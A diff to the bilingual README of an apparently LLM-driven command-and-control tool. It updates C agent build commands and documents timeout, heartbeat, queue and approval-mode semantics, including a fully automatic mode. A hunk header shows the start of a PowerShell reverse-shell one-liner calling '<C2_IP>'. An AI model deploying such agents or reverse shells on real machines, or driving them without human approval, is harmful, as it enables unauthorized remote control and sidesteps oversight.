@@ -140,8 +140,8 @@ build\build_all.bat         # Windows
 #### 7.3 C 受控端
 
 ```bash
-# Linux / macOS
-gcc -O2 -Wall -Wextra -o c2agent_remote remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c
+# Linux / macOS（心跳跑在线程上，链接 pthread）
+gcc -O2 -Wall -Wextra -o c2agent_remote remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c -lpthread
 # Windows (MinGW-w64)
 gcc -O2 -Wall -Wextra -o c2agent_remote.exe remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c -lws2_32
 ```
@@ -275,7 +275,13 @@ powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',88
 - **授权模式**：`0` N-Auto 全部需授权；`1` H-Auto 低风险（`get_cwd`/`list_dir`/`read_file`）自动、其余需授权；`2` F-Auto 全部自动。
 - **轮数**：`round_limit` 限制单轮「LLM→动作→回灌」次数；**授权通过时清零**（拒绝不清零），任何模式都生效。
 - **拒绝语义**：被拒动作**绝不下发**受控端，作为 tool 结果回灌后**结束本轮**。
-- **指令队列**：每 Agent 一条 FIFO；**排队等待无超时**，**执行中受 `cmd_timeout`**；执行超时按 `timeout_action`（默认 `disconnect`：断开该 Agent；或 `fail`：仅失败当前会话 Job）。
+- **指令队列**：每 Agent 一条 FIFO；**排队等待无超时**，**执行中受 `cmd_timeout`**。
+- **执行超时语义**（`timeout_action`）：
+  - `disconnect`（默认）：断开该 Agent，等待其重连。
+  - `fail`：**保留连接**。当前 Job 报超时失败，并**清空该 Agent 的排队指令**；由于受控端上的命令可能仍在运行，C2 在它真正结束前（`Busy`）会拒绝新指令（直接报错、不再下发）。受控端返回后即可正常下发新指令。
+    - **Native**：超时会重置该 Agent 的心跳计时（避免 watchdog 立即误踢），给一个 `native.heartbeat_timeout_sec` 的宽限窗口；若命令始终不返回，watchdog 到期仍会回收该 Agent。
+    - **Shell**：无心跳/watchdog，若卡死命令永不返回，需由用户 `/shutdown` 关闭；关闭时会先写 `exit`，**1 秒内对端未关闭则强制断开连接**（Native 的 shutdown 同样带有 1 秒兜底强关）。
+- **受控端并发**：Go / C 受控端将**心跳与指令执行分离到不同线程**（心跳独立发送，写操作按全局锁串行），因此执行长命令期间不会饿死心跳；执行超时按进程树终止，Go 另设 `WaitDelay` 兜底，C/Go 均启用 TCP keepalive。
 
 ### 14. 测试
 
@@ -424,8 +430,8 @@ build\build_all.bat         # Windows
 #### 7.3 C agent
 
 ```bash
-# Linux / macOS
-gcc -O2 -Wall -Wextra -o c2agent_remote remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c
+# Linux / macOS (heartbeat runs on a thread; link pthread)
+gcc -O2 -Wall -Wextra -o c2agent_remote remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c -lpthread
 # Windows (MinGW-w64)
 gcc -O2 -Wall -Wextra -o c2agent_remote.exe remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c -lws2_32
 ```
@@ -563,7 +569,13 @@ file transfer uses base64.
 - **Auth modes**: `0` N-Auto (all need approval); `1` H-Auto (low-risk `get_cwd`/`list_dir`/`read_file` auto, rest need approval); `2` F-Auto (all auto).
 - **Rounds**: `round_limit` caps the "LLM → action → feedback" loop; an **approval resets** it (a denial does not), in every mode.
 - **Denial semantics**: the denied action is **never dispatched**; it is fed back as a tool result and the **turn ends**.
-- **Command queue**: one FIFO per agent; **queue wait is unbounded**, **execution is bounded by `cmd_timeout`**; on timeout, `timeout_action` (default `disconnect`: drop the agent; or `fail`: fail only the current session's job).
+- **Command queue**: one FIFO per agent; **queue wait is unbounded**, **execution is bounded by `cmd_timeout`**.
+- **Execution-timeout semantics** (`timeout_action`):
+  - `disconnect` (default): drop the agent and wait for it to reconnect.
+  - `fail`: **keep the connection**. The current job fails with a timeout and the agent's **queued jobs are discarded**; while the command may still be running, new jobs are rejected (reported as busy, not dispatched) until the controlled end finishes.
+    - **Native**: the timeout resets the agent's heartbeat timer (so the watchdog does not drop it immediately), granting one `native.heartbeat_timeout_sec` grace window; if the command never returns, the watchdog still reclaims the agent.
+    - **Shell**: no heartbeat/watchdog — if a stuck command never returns, the user must `/shutdown`; shutdown writes `exit` and **force-closes the connection after 1s** if the peer does not close (Native shutdown has the same 1s force-close fallback).
+- **Controlled-end concurrency**: the Go / C agents run **heartbeats on a separate thread from command execution** (all writes serialized by a global lock), so a long command cannot starve heartbeats; timeouts kill the whole process tree, Go sets `WaitDelay`, and both enable TCP keepalive.
 
 ### 14. Tests
 
